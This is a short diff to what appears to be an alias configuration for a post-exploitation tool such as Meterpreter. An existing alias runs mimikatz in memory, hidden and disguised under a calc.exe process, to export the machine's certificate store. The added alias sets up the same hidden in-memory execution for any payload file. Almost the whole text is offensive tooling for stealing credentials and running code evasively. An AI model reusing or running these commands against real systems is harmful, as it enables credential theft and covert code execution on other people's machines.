@@ -8,3 +8,4 @@ alias -f j jobs -l -v
 # the one below just picks the interface starting with 172
 alias -f ip ifconfig | grep "inet 172" | cut -d " " -f 2
 alias -f mimi execute -H -i -c -m -d calc.exe -f mimikatz.exe -a "'crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE" exit' 
+alias in_mem execute -H -i -c -m -d calc.exe -f
